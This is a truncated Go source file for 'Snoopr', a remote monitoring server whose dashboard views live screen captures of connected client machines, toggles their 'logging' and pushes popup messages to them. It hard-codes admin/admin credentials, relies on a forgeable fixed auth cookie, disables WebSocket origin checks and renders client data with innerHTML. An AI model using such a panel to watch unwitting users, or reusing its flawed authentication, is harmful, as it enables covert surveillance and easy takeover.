package main

import (
	"encoding/json"
	"fmt"
	"log"
	"net"
	"net/http"
	"os"
	"os/exec"
	"runtime"
	"sync"
	"time"

	"github.com/gorilla/mux"
	"github.com/gorilla/websocket"
)

// getLocalIP returns the local network IP address
func getLocalIP() string {
	conn, err := net.Dial("udp", "8.8.8.8:80")
	if err != nil {
		return "127.0.0.1"
	}
	defer conn.Close()

	localAddr := conn.LocalAddr().(*net.UDPAddr)
	return localAddr.IP.String()
}

type Server struct {
	clients    map[string]*Client
	clientsMux sync.RWMutex
	upgrader   websocket.Upgrader
	username   string
	password   string
}

type Client struct {
	ID       string    `json:"id"`
	IP       string    `json:"ip"`
	Hostname string    `json:"hostname"`
	OS       string    `json:"os"`
	LastSeen time.Time `json:"lastSeen"`
	Conn     *websocket.Conn
}

type Message struct {
	Type string      `json:"type"`
	From string      `json:"from"`
	To   string      `json:"to"`
	Data interface{} `json:"data"`
	Time time.Time   `json:"time"`
}

type ActivityLog struct {
	ClientID  string    `json:"clientId"`
	Type      string    `json:"type"`
	Data      string    `json:"data"`
	Timestamp time.Time `json:"timestamp"`
}

var server *Server
var activityLogs []ActivityLog
var logsMux sync.RWMutex
var dashboardClients = make(map[*websocket.Conn]bool)
var dashboardMux sync.RWMutex

func main() {
	server = &Server{
		clients:  make(map[string]*Client),
		username: "admin",
		password: "admin",
		upgrader: websocket.Upgrader{
			CheckOrigin: func(r *http.Request) bool {
				return true
			},
		},
	}

	// Windows-specific setup
	if runtime.GOOS == "windows" {
		elevatePrivileges()
		openFirewallPort()
	}

	// Check if port is available
	if !isPortAvailable(8080) {
		fmt.Printf("Error: Port 8080 is already in use!\n")
		fmt.Printf("Please:\n")
		fmt.Printf("1. Close any other applications using port 8080\n")
		fmt.Printf("2. Or modify the port in the source code\n")
		fmt.Printf("3. Check with: netstat -ano | findstr :8080\n")
		os.Exit(1)
	}

	r := mux.NewRouter()

	// Authentication middleware
	authMiddleware := func(next http.HandlerFunc) http.HandlerFunc {
		return func(w http.ResponseWriter, r *http.Request) {
			if r.URL.Path == "/login" || r.URL.Path == "/auth" {
				next(w, r)
				return
			}

			cookie, err := r.Cookie("auth")
			if err != nil || cookie.Value != "authenticated" {
				http.Redirect(w, r, "/login", http.StatusFound)
				return
			}
			next(w, r)
		}
	}

	// Static files and routes
	r.PathPrefix("/static/").Handler(http.StripPrefix("/static/", http.FileServer(http.Dir("./web/static/"))))
	r.HandleFunc("/login", loginHandler)
	r.HandleFunc("/auth", authHandler)
	r.HandleFunc("/", authMiddleware(dashboardHandler))
	r.HandleFunc("/api/clients", authMiddleware(clientsHandler))
	r.HandleFunc("/api/logs", authMiddleware(logsHandler))
	r.HandleFunc("/api/message", authMiddleware(messageHandler))
	r.HandleFunc("/api/command", authMiddleware(commandHandler))
	r.HandleFunc("/api/settings", authMiddleware(settingsHandler))
	r.HandleFunc("/ws/client", clientWebSocketHandler)
	r.HandleFunc("/ws/dashboard", authMiddleware(dashboardWebSocketHandler))

	localIP := getLocalIP()

	fmt.Println("Snoopr Server starting on :8080")
	fmt.Println("\nDashboard Access:")
	fmt.Printf("   Local:   http://localhost:8080\n")
	fmt.Printf("   Network: http://%s:8080\n", localIP)
	fmt.Printf("\nCredentials: %s / %s\n", server.username, server.password)

	if runtime.GOOS == "windows" {
		fmt.Println("\nWindows Notes:")
		fmt.Println("- If Windows Firewall blocks connections, manually allow port 8080")
		fmt.Println("- For network access, ensure port 8080 is accessible from other machines")
	}

	fmt.Println("\nServer ready! Press Ctrl+C to stop.")

	err := http.ListenAndServe("0.0.0.0:8080", r)
	if err != nil {
		fmt.Printf("Server failed to start: %v\n", err)
		if runtime.GOOS == "windows" {
			fmt.Println("\nWindows troubleshooting:")
			fmt.Println("1. Run as Administrator for full functionality")
			fmt.Println("2. Check if port 8080 is in use: netstat -ano | findstr :8080")
			fmt.Println("3. Try disabling Windows Firewall temporarily")
		}
		os.Exit(1)
	}
}

func elevatePrivileges() {
	// Check if already running as admin
	if !isAdmin() {
		fmt.Println("Note: For full functionality on Windows, run as Administrator")
		fmt.Println("Some features like firewall configuration may not work")
		return
	}
}

func isAdmin() bool {
	if runtime.GOOS != "windows" {
		return true
	}

	cmd := exec.Command("net", "session")
	err := cmd.Run()
	return err == nil
}

func isPortAvailable(port int) bool {
	address := fmt.Sprintf(":%d", port)
	listener, err := net.Listen("tcp", address)
	if err != nil {
		return false
	}
	listener.Close()
	return true
}

func openFirewallPort() {
	if runtime.GOOS != "windows" {
		return
	}

	// Only try to open firewall if running as admin
	if !isAdmin() {
		fmt.Println("Skipping firewall configuration (not running as admin)")
		return
	}

	fmt.Println("Configuring Windows firewall...")

	// Remove existing rule first (ignore errors)
	cmd := exec.Command("netsh", "advfirewall", "firewall", "delete", "rule", "name=Snoopr Server")
	cmd.Run()

	// Add new rule
	cmd = exec.Command("netsh", "advfirewall", "firewall", "add", "rule",
		"name=Snoopr Server", "dir=in", "action=allow", "protocol=TCP", "localport=8080")
	err := cmd.Run()
	if err != nil {
		fmt.Printf("Warning: Could not configure firewall rule: %v\n", err)
		fmt.Println("You may need to manually allow port 8080 in Windows Firewall")
	} else {
		fmt.Println("Firewall rule added successfully")
	}
}

func loginHandler(w http.ResponseWriter, r *http.Request) {
	tmpl := `
<!DOCTYPE html>
<html>
<head>
    <title>Snoopr - Login</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap');
        
        * { 
            box-sizing: border-box; 
            margin: 0; 
            padding: 0; 
        }
        
        body { 
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif; 
            background: linear-gradient(135deg, #000000 0%, #111111 50%, #1a1a1a 100%);
            color: #e5e5e5;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            position: relative;
            overflow: hidden;
        }
        
        /* Animated background particles */
        body::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: radial-gradient(circle at 25% 25%, rgba(255, 255, 255, 0.02) 0%, transparent 50%),
                        radial-gradient(circle at 75% 75%, rgba(255, 255, 255, 0.02) 0%, transparent 50%),
                        radial-gradient(circle at 50% 50%, rgba(255, 255, 255, 0.01) 0%, transparent 50%);
            animation: float 20s ease-in-out infinite;
        }
        
        @keyframes float {
            0%, 100% { transform: translateY(0px) rotate(0deg); }
            50% { transform: translateY(-20px) rotate(180deg); }
        }
        
        .login-container { 
            position: relative;
            z-index: 1;
            width: 100%;
            max-width: 400px;
            padding: 2rem;
        }
        
        .login-form { 
            background: rgba(20, 20, 20, 0.95);
            backdrop-filter: blur(20px);
            padding: 3rem 2.5rem;
            border-radius: 16px;
            border: 1px solid rgba(60, 60, 60, 0.3);
            box-shadow: 
                0 20px 40px rgba(0, 0, 0, 0.6),
                0 0 0 1px rgba(255, 255, 255, 0.05) inset;
            position: relative;
            overflow: hidden;
        }
        
        .login-form::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            height: 1px;
            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.1), transparent);
        }
        
        .login-header {
            text-align: center;
            margin-bottom: 2.5rem;
        }
        
        .login-form h2 { 
            font-size: 1.875rem;
            font-weight: 700;
            color: #ffffff;
            margin-bottom: 0.5rem;
            text-shadow: 0 2px 4px rgba(0, 0, 0, 0.3);
        }
        
        .login-subtitle {
            font-size: 0.875rem;
            color: #999999;
            font-weight: 400;
        }
        
        .form-group { 
            margin-bottom: 1.5rem; 
        }
        
        .form-group label { 
            display: block; 
            margin-bottom: 0.75rem;
            font-weight: 500;
            color: #cccccc;
            font-size: 0.875rem;
        }
        
        .form-group input { 
            width: 100%; 
            padding: 1rem 1.25rem;
            border: 1px solid rgba(120, 120, 120, 0.3);
            background: rgba(30, 30, 30, 0.8);
            color: #ffffff;
            border-radius: 12px;
            font-size: 1rem;
            transition: all 0.3s ease;
            backdrop-filter: blur(10px);
        }
        
        .form-group input:focus {
            outline: none;
            border-color: rgba(255, 255, 255, 0.3);
            background: rgba(30, 30, 30, 1);
            box-shadow: 
                0 0 0 3px rgba(255, 255, 255, 0.05),
                0 4px 12px rgba(0, 0, 0, 0.2);
            transform: translateY(-1px);
        }
        
        .form-group input::placeholder {
            color: #666666;
        }
        
        .btn { 
            background: linear-gradient(45deg, #444444, #333333);
            color: white; 
            padding: 1rem 2rem;
            border: none; 
            border-radius: 12px;
            cursor: pointer; 
            width: 100%;
            font-size: 1rem;
            font-weight: 600;
            transition: all 0.3s ease;
            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.3);
            position: relative;
            overflow: hidden;
        }
        
        .btn::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.1), transparent);
            transition: left 0.5s ease;
        }
        
        .btn:hover {
            background: linear-gradient(45deg, #555555, #444444);
            transform: translateY(-2px);
            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.4);
        }
        
        .btn:hover::before {
            left: 100%;
        }
        
        .btn:active {
            transform: translateY(0);
        }
        
        .login-footer {
            text-align: center;
            margin-top: 2rem;
            padding-top: 1.5rem;
            border-top: 1px solid rgba(60, 60, 60, 0.3);
        }
        
        .login-footer p {
            font-size: 0.75rem;
            color: #666666;
            margin: 0;
        }
        
        .version {
            display: inline-block;
            background: rgba(60, 60, 60, 0.3);
            padding: 0.25rem 0.75rem;
            border-radius: 20px;
            font-size: 0.625rem;
            color: #888888;
            margin-top: 0.75rem;
        }
        
        @media (max-width: 480px) {
            .login-container {
                padding: 1rem;
            }
            
            .login-form {
                padding: 2rem 1.5rem;
            }
            
            .login-form h2 {
                font-size: 1.5rem;
            }
        }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="login-form">
            <div class="login-header">
                <h2>Snoopr Dashboard</h2>
                <p class="login-subtitle">Advanced Remote Monitoring System</p>
            </div>
            <form method="POST" action="/auth">
                <div class="form-group">
                    <label for="username">Username</label>
                    <input type="text" id="username" name="username" placeholder="Enter your username" required autocomplete="username">
                </div>
                <div class="form-group">
                    <label for="password">Password</label>
                    <input type="password" id="password" name="password" placeholder="Enter your password" required autocomplete="current-password">
                </div>
                <button type="submit" class="btn">Sign In</button>
            </form>
            <div class="login-footer">
                <p>Secure authentication required</p>
                <span class="version">v1.0.0</span>
            </div>
        </div>
    </div>
</body>
</html>`

	w.Header().Set("Content-Type", "text/html")
	w.Write([]byte(tmpl))
}

func authHandler(w http.ResponseWriter, r *http.Request) {
	username := r.FormValue("username")
	password := r.FormValue("password")

	if username == server.username && password == server.password {
		http.SetCookie(w, &http.Cookie{
			Name:  "auth",
			Value: "authenticated",
			Path:  "/",
		})
		http.Redirect(w, r, "/", http.StatusFound)
	} else {
		http.Redirect(w, r, "/login", http.StatusFound)
	}
}

func dashboardHandler(w http.ResponseWriter, r *http.Request) {
	tmpl := `
<!DOCTYPE html>
<html>
<head>
    <title>Snoopr Dashboard</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap');
        
        * { box-sizing: border-box; }
        
        body { 
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif; 
            background: linear-gradient(135deg, #000000 0%, #111111 50%, #1a1a1a 100%);
            color: #e5e5e5; 
            margin: 0; 
            padding: 0; 
            font-size: 14px;
            line-height: 1.6;
        }
        
        .header { 
            background: linear-gradient(90deg, #1a1a1a 0%, #2a2a2a 100%);
            padding: 1.5rem 2rem; 
            border-bottom: 3px solid #333333;
            box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.5);
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        
        .header h1 { 
            margin: 0; 
            color: #ffffff; 
            display: inline-block; 
            font-weight: 700;
            font-size: 1.75rem;
            text-shadow: 0 2px 4px rgba(255, 255, 255, 0.2);
        }
        
        .header .subtitle {
            display: block;
            font-size: 0.875rem;
            color: #999999;
            font-weight: 400;
            margin-top: 0.25rem;
        }
        
        .logout { 
            background: linear-gradient(45deg, #dc2626, #b91c1c);
            color: white; 
            padding: 0.75rem 1.5rem; 
            text-decoration: none; 
            border-radius: 8px; 
            font-weight: 500;
            transition: all 0.2s ease;
            box-shadow: 0 2px 4px rgba(220, 38, 38, 0.3);
        }
        
        .logout:hover {
            background: linear-gradient(45deg, #b91c1c, #991b1b);
            transform: translateY(-1px);
            box-shadow: 0 4px 8px rgba(220, 38, 38, 0.4);
        }
        
        .container { 
            display: flex; 
            height: calc(100vh - 95px); 
            gap: 1rem;
            padding: 1rem;
        }
        
        .sidebar { 
            width: 320px; 
            background: rgba(20, 20, 20, 0.9);
            backdrop-filter: blur(10px);
            padding: 1.5rem; 
            border-radius: 12px;
            border: 1px solid rgba(60, 60, 60, 0.5);
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.6);
            overflow-y: auto;
        }
        
        .main-content { 
            flex: 1; 
            background: rgba(20, 20, 20, 0.9);
            backdrop-filter: blur(10px);
            padding: 1.5rem; 
            border-radius: 12px;
            border: 1px solid rgba(60, 60, 60, 0.5);
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.6);
            overflow-y: auto;
        }
        
        .section-title {
            font-size: 1.125rem;
            font-weight: 600;
            color: #f1f5f9;
            margin-bottom: 1rem;
            padding-bottom: 0.5rem;
            border-bottom: 2px solid #666666;
            display: flex;
            align-items: center;
            gap: 0.5rem;
        }
        
        .client-list { margin-bottom: 2rem; }
        
        .client-item { 
            background: linear-gradient(135deg, #333333 0%, #2a2a2a 100%);
            margin: 0.75rem 0; 
            padding: 1rem 1.25rem; 
            border-radius: 8px; 
            cursor: pointer;
            border: 1px solid transparent;
            transition: all 0.2s ease;
            position: relative;
            overflow: hidden;
        }
        
        .client-item::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: linear-gradient(135deg, rgba(120, 120, 120, 0.1) 0%, rgba(100, 100, 100, 0.1) 100%);
            opacity: 0;
            transition: opacity 0.2s ease;
        }
        
        .client-item:hover::before {
            opacity: 1;
        }
        
        .client-item:hover { 
            transform: translateY(-2px);
            box-shadow: 0 4px 12px rgba(120, 120, 120, 0.2);
            border-color: rgba(120, 120, 120, 0.3);
        }
        
        .client-item.active { 
            border-left: 4px solid #888888;
            background: linear-gradient(135deg, #444444 0%, #555555 100%);
            box-shadow: 0 4px 12px rgba(120, 120, 120, 0.3);
        }
        
        .client-info {
            position: relative;
            z-index: 1;
        }
        
        .client-hostname {
            font-weight: 600;
            color: #f1f5f9;
            font-size: 1rem;
            margin-bottom: 0.25rem;
        }
        
        .client-ip {
            font-size: 0.875rem;
            color: #94a3b8;
            margin-bottom: 0.5rem;
        }
        
        .controls { 
            background: linear-gradient(135deg, #2a2a2a 0%, #1a1a1a 100%);
            padding: 1.5rem; 
            margin-bottom: 1.5rem; 
            border-radius: 12px;
            border: 1px solid rgba(100, 100, 100, 0.3);
            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.4);
        }
        
        .btn { 
            background: linear-gradient(45deg, #444444, #333333);
            color: white; 
            padding: 0.75rem 1.25rem; 
            border: none; 
            border-radius: 8px; 
            cursor: pointer; 
            margin: 0.25rem; 
            font-weight: 500;
            font-size: 0.875rem;
            transition: all 0.2s ease;
            box-shadow: 0 2px 4px rgba(68, 68, 68, 0.3);
        }
        
        .btn:hover { 
            background: linear-gradient(45deg, #555555, #444444);
            transform: translateY(-1px);
            box-shadow: 0 4px 8px rgba(68, 68, 68, 0.4);
        }
        
        .btn.danger { 
            background: linear-gradient(45deg, #ef4444, #dc2626);
            box-shadow: 0 2px 4px rgba(239, 68, 68, 0.3);
        }
        
        .btn.danger:hover {
            background: linear-gradient(45deg, #dc2626, #b91c1c);
            box-shadow: 0 4px 8px rgba(239, 68, 68, 0.4);
        }
        
        .btn.success { 
            background: linear-gradient(45deg, #10b981, #059669);
            box-shadow: 0 2px 4px rgba(16, 185, 129, 0.3);
        }
        
        .btn.success:hover {
            background: linear-gradient(45deg, #059669, #047857);
            box-shadow: 0 4px 8px rgba(16, 185, 129, 0.4);
        }
        
        .btn.fullscreen {
            background: linear-gradient(45deg, #666666, #555555);
            box-shadow: 0 2px 4px rgba(102, 102, 102, 0.3);
        }
        
        .btn.fullscreen:hover {
            background: linear-gradient(45deg, #777777, #666666);
            box-shadow: 0 4px 8px rgba(102, 102, 102, 0.4);
        }
        
        .screen-container {
            background: linear-gradient(135deg, #2a2a2a 0%, #1a1a1a 100%);
            padding: 1.5rem; 
            border-radius: 12px; 
            margin-bottom: 1.5rem; 
            border: 1px solid rgba(100, 100, 100, 0.3);
            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.4);
            position: relative;
        }
        
        .screen-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 1rem;
        }
        
        .screen-view {
            height: 400px; 
            overflow: hidden;
            border-radius: 8px;
            background: #000;
            border: 2px solid rgba(100, 100, 100, 0.2);
            position: relative;
        }
        
        .screen-placeholder {
            display: flex;
            align-items: center;
            justify-content: center;
            height: 100%;
            color: #999999;
            font-size: 1rem;
            text-align: center;
            background: radial-gradient(circle at center, #2a2a2a 0%, #1a1a1a 100%);
        }
        
        .live-screen {
            max-width: 100%; 
            max-height: 100%;
            width: auto;
            height: auto;
            display: block;
            margin: 0 auto;
            border-radius: 4px;
        }
        
        .logs { 
            background: linear-gradient(135deg, #2a2a2a 0%, #1a1a1a 100%);
            padding: 1.5rem; 
            border-radius: 12px; 
            height: 400px; 
            overflow-y: auto;
            border: 1px solid rgba(100, 100, 100, 0.3);
            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.4);
        }
        
        .log-entry { 
            padding: 0.75rem; 
            border-bottom: 1px solid rgba(100, 100, 100, 0.3); 
            font-size: 0.875rem;
            font-family: 'Monaco', 'Consolas', monospace;
            border-radius: 4px;
            margin-bottom: 0.25rem;
            background: rgba(60, 60, 60, 0.3);
        }
        
        .log-entry:hover {
            background: rgba(80, 80, 80, 0.5);
        }
        
        .message-input { 
            width: 100%; 
            padding: 0.75rem; 
            background: rgba(60, 60, 60, 0.8);
            border: 1px solid rgba(120, 120, 120, 0.5); 
            color: #f1f5f9; 
            border-radius: 8px;
            font-size: 0.875rem;
            margin: 0.5rem 0;
            transition: all 0.2s ease;
        }
        
        .message-input:focus {
            outline: none;
            border-color: #888888;
            box-shadow: 0 0 0 3px rgba(120, 120, 120, 0.1);
            background: rgba(60, 60, 60, 1);
        }
        
        .status { 
            padding: 0.25rem 0.75rem; 
            border-radius: 12px; 
            font-size: 0.75rem; 
            font-weight: 500;
            text-transform: uppercase;
            letter-spacing: 0.05em;
        }
        
        .status.online { 
            background: linear-gradient(45deg, #10b981, #059669);
            color: white;
            box-shadow: 0 2px 4px rgba(16, 185, 129, 0.3);
        }
        
        .status.offline { 
            background: linear-gradient(45deg, #ef4444, #dc2626);
            color: white;
            box-shadow: 0 2px 4px rgba(239, 68, 68, 0.3);
        }
        
        /* Fullscreen Modal */
        .fullscreen-modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.95);
            z-index: 9999;
            backdrop-filter: blur(10px);
        }
        
        .fullscreen-content {
            position: relative;
            width: 100%;
            height: 100%;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 2rem;
        }
        
        .fullscreen-image {
            max-width: 100%;
            max-height: 100%;
            border-radius: 8px;
            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.5);
        }
        
        .fullscreen-controls {
            position: absolute;
            top: 2rem;
            right: 2rem;
            display: flex;
            gap: 1rem;
        }
        
        .fullscreen-info {
            position: absolute;
            bottom: 2rem;
            left: 2rem;
            background: rgba(30, 41, 59, 0.9);
            padding: 1rem 1.5rem;
            border-radius: 8px;
            backdrop-filter: blur(10px);
        }
        
        /* Animations */
        @keyframes pulse {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.5; }
        }
        
        .pulse {
            animation: pulse 2s infinite;
        }
        
        /* Scrollbar styling */
        ::-webkit-scrollbar {
            width: 8px;
        }
        
        ::-webkit-scrollbar-track {
            background: rgba(55, 65, 81, 0.3);
            border-radius: 4px;
        }
        
        ::-webkit-scrollbar-thumb {
            background: linear-gradient(45deg, #3b82f6, #2563eb);
            border-radius: 4px;
        }
        
        ::-webkit-scrollbar-thumb:hover {
            background: linear-gradient(45deg, #2563eb, #1d4ed8);
        }
    </style>
</head>
<body>
    <div class="header">
        <div>
            <h1>Snoopr Dashboard</h1>
            <span class="subtitle">Advanced Remote Monitoring System</span>
        </div>
        <a href="/login" class="logout">Logout</a>
    </div>
    <div class="container">
        <div class="sidebar">
            <h3 class="section-title">
                Connected Clients
            </h3>
            <div id="clients" class="client-list">
                <!-- Clients will be populated here -->
            </div>
            <div class="controls">
                <h4 class="section-title">Controls</h4>
                <button class="btn" onclick="sendMessage()">Send Message</button>
                <button class="btn success" onclick="startLogging()">Start Logging</button>
                <button class="btn danger" onclick="stopLogging()">Stop Logging</button>
                <br><br>
                <button class="btn success" onclick="startScreenShare()">Start Screen Share</button>
                <button class="btn danger" onclick="stopScreenShare()">Stop Screen Share</button>
                <br><br>
                <input type="text" id="messageInput" class="message-input" placeholder="Type message to send to client...">
                <br><br>
                <button class="btn" onclick="refreshClients()">Refresh Clients</button>
            </div>
        </div>
        <div class="main-content">
            <div class="screen-container">
                <div class="screen-header">
                    <h3 class="section-title">
                        Live Screen View
                    </h3>
                    <div>
                        <button class="btn fullscreen" onclick="toggleFullscreen()" id="fullscreenBtn">
                            Fullscreen
                        </button>
                    </div>
                </div>
                <div class="screen-view" id="screenView">
                    <div class="screen-placeholder" id="noScreenMessage">
                        <div>
                            <div style="font-size: 3rem; margin-bottom: 1rem;"></div>
                            <div>Select a client and start screen sharing to view live feed</div>
                            <div style="font-size: 0.875rem; color: #9ca3af; margin-top: 0.5rem;">Real-time monitoring with 500ms updates</div>
                        </div>
                    </div>
                    <img id="liveScreen" class="live-screen" style="display: none;" alt="Live Screen">
                </div>
            </div>
            
            <h3 class="section-title">
                Activity Logs
            </h3>
            <div id="logs" class="logs">
                <!-- Logs will be populated here -->
            </div>
        </div>
        
        <!-- Fullscreen Modal -->
        <div class="fullscreen-modal" id="fullscreenModal">
            <div class="fullscreen-content">
                <div class="fullscreen-controls">
                    <button class="btn danger" onclick="closeFullscreen()">Close</button>
                </div>
                <img id="fullscreenImage" class="fullscreen-image" alt="Fullscreen View">
                <div class="fullscreen-info" id="fullscreenInfo">
                    <div style="font-weight: 600; margin-bottom: 0.5rem;">Client Information</div>
                    <div id="fullscreenClientInfo">No client selected</div>
                </div>
            </div>
        </div>
    </div>

    <script>
        let selectedClient = null;
        let ws = null;

        function connectWebSocket() {
            const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
            const host = window.location.host;
            ws = new WebSocket(protocol + '//' + host + '/ws/dashboard');
            ws.onmessage = function(event) {
                const message = JSON.parse(event.data);
                handleWebSocketMessage(message);
            };
            ws.onclose = function() {
                setTimeout(connectWebSocket, 3000);
            };
        }

        function handleWebSocketMessage(message) {
            if (message.type === 'client_update') {
                refreshClients();
            } else if (message.type === 'activity_log') {
                addLogEntry(message.data);
            } else if (message.type === 'screen_capture') {
                updateScreenView(message.data);
            }
        }

        function refreshClients() {
            fetch('/api/clients')
                .then(response => response.json())
                .then(clients => {
                    const clientsDiv = document.getElementById('clients');
                    clientsDiv.innerHTML = '';
                    clients.forEach(client => {
                        const div = document.createElement('div');
                        div.className = 'client-item';
                        div.onclick = () => selectClient(client.id, client.hostname, client.ip);
                        div.innerHTML = '<div class="client-info">' +
                                       '<div class="client-hostname">' + client.hostname + '</div>' +
                                       '<div class="client-ip">' + client.ip + '</div>' +
                                       '<span class="status online">Online</span>' +
                                       '</div>';
                        clientsDiv.appendChild(div);
                    });
                });
        }

        let selectedClientInfo = { id: null, hostname: '', ip: '' };

        function selectClient(clientId, hostname, ip) {
            selectedClient = clientId;
            selectedClientInfo = { id: clientId, hostname: hostname, ip: ip };
            
            document.querySelectorAll('.client-item').forEach(item => {
                item.classList.remove('active');
            });
            event.target.closest('.client-item').classList.add('active');
            
            // Update fullscreen info
            document.getElementById('fullscreenClientInfo').innerHTML = 
                '<div>Hostname: ' + hostname + '</div>' +
                '<div>IP: ' + ip + '</div>' +
                '<div>Status: Connected</div>';
        }

        function sendMessage() {
            const message = document.getElementById('messageInput').value;
            if (!message || !selectedClient) {
                alert('Please select a client and enter a message');
                return;
            }
            
            fetch('/api/message', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({clientId: selectedClient, message: message})
            });
            
            document.getElementById('messageInput').value = '';
        }

        function startLogging() {
            if (!selectedClient) {
                alert('Please select a client');
                return;
            }
            sendCommand('start_logging');
        }

        function stopLogging() {
            if (!selectedClient) {
                alert('Please select a client');
                return;
            }
            sendCommand('stop_logging');
        }

        function startScreenShare() {
            if (!selectedClient) {
                alert('Please select a client first');
                return;
            }
            sendCommand('start_screen_share');
            
            // Show loading state
            const placeholder = document.getElementById('noScreenMessage');
            placeholder.innerHTML = '<div class="pulse">' +
                '<div style="font-size: 3rem; margin-bottom: 1rem;">⚪</div>' +
                '<div>Connecting to client screen...</div>' +
                '<div style="font-size: 0.875rem; color: #9ca3af; margin-top: 0.5rem;">This may take a few seconds</div>' +
                '</div>';
        }

        function stopScreenShare() {
            if (!selectedClient) {
                alert('Please select a client first');
                return;
            }
            sendCommand('stop_screen_share');
            
            // Reset to default state
            document.getElementById('liveScreen').style.display = 'none';
            document.getElementById('noScreenMessage').innerHTML = '<div>' +
                '<div style="font-size: 3rem; margin-bottom: 1rem;">⚪</div>' +
                '<div>Select a client and start screen sharing to view live feed</div>' +
                '<div style="font-size: 0.875rem; color: #9ca3af; margin-top: 0.5rem;">Real-time monitoring with 500ms updates</div>' +
                '</div>';
            document.getElementById('noScreenMessage').style.display = 'block';
            
            // Disable fullscreen button
            document.getElementById('fullscreenBtn').disabled = true;
            closeFullscreen();
        }

        function sendCommand(command) {
            fetch('/api/command', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({clientId: selectedClient, command: command})
            });
        }

        function updateScreenView(data) {
            if (data.clientId === selectedClient && data.image) {
                const img = document.getElementById('liveScreen');
                const fullscreenImg = document.getElementById('fullscreenImage');
                const imageData = 'data:image/jpeg;base64,' + data.image;
                
                img.src = imageData;
                fullscreenImg.src = imageData;
                img.style.display = 'block';
                document.getElementById('noScreenMessage').style.display = 'none';
                
                // Enable fullscreen button
                document.getElementById('fullscreenBtn').disabled = false;
            }
        }

        function toggleFullscreen() {
            if (!selectedClient) {
                alert('Please select a client and start screen sharing first');
                return;
            }
            
            const modal = document.getElementById('fullscreenModal');
            modal.style.display = 'block';
            document.body.style.overflow = 'hidden';
        }

        function closeFullscreen() {
            const modal = document.getElementById('fullscreenModal');
            modal.style.display = 'none';
            document.body.style.overflow = 'auto';
        }

        // Close fullscreen on Escape key
        document.addEventListener('keydown', function(event) {
            if (event.key === 'Escape') {
                closeFullscreen();
            }
        });

        // Close fullscreen when clicking outside the image
        document.getElementById('fullscreenModal').addEventListener('click', function(event) {
            if (event.target === this) {
                closeFullscreen();
            }
        });

        function loadLogs() {
            fetch('/api/logs')
                .then(response => response.json())
                .then(logs => {
                    const logsDiv = document.getElementById('logs');
                    logsDiv.innerHTML = '';
                    logs.forEach(log => {
                        addLogEntry(log);
                    });
                });
        }

        function addLogEntry(log) {
            const logsDiv = document.getElementById('logs');
            const div = document.createElement('div');
            div.className = 'log-entry';
            div.innerHTML = '<strong>[' + new Date(log.timestamp).toLocaleString() + ']</strong> ' +
                           '<em>' + log.clientId + '</em>: ' + log.type + ' - ' + log.data;
            logsDiv.appendChild(div);
            logsDiv.scrollTop = logsDiv.scrollHeight;
        }

        // Initialize
        connectWebSocket();
        refreshClients();
        loadLogs();
        setInterval(refreshClients, 5000);
        setInterval(loadLogs, 2000);
        
        // Initialize UI state
        document.getElementById('fullscreenBtn').disabled = true;
    </script>
</body>
</html>`

	w.Header().Set("Content-Type", "text/html")
	w.Write([]byte(tmpl))
}

func clientsHandler(w http.ResponseWriter, r *http.Request) {
	server.clientsMux.RLock()
	clients := make([]*Client, 0, len(server.clients))
	for _, client := range server.clients {
		clients = append(clients, client)
	}
	server.clientsMux.RUnlock()

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(clients)
}

func logsHandler(w http.ResponseWriter, r *http.Request) {
	logsMux.RLock()
	defer logsMux.RUnlock()

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(activityLogs)
}

func messageHandler(w http.ResponseWriter, r *http.Request) {
	if r.Method != "POST" {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}

	var req struct {
		ClientID string `json:"clientId"`
		Message  string `json:"message"`
	}

	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		http.Error(w, "Invalid JSON", http.StatusBadRequest)
		return
	}

	server.clientsMux.RLock()
	client, exists := server.clients[req.ClientID]
	server.clientsMux.RUnlock()

	if !exists {
		http.Error(w, "Client not found", http.StatusNotFound)
		return
	}

	msg := Message{
		Type: "popup_message",
		Data: req.Message,
		Time: time.Now(),
	}

	client.Conn.WriteJSON(msg)

	// Log the message
	logsMux.Lock()
	activityLogs = append(activityLogs, ActivityLog{
		ClientID:  req.ClientID,
		Type:      "message_sent",
		Data:      req.Message,
		Timestamp: time.Now(),
	})
	logsMux.Unlock()

	w.WriteHeader(http.StatusOK)
}

func commandHandler(w http.ResponseWriter, r *http.Request) {
	if r.Method != "POST" {
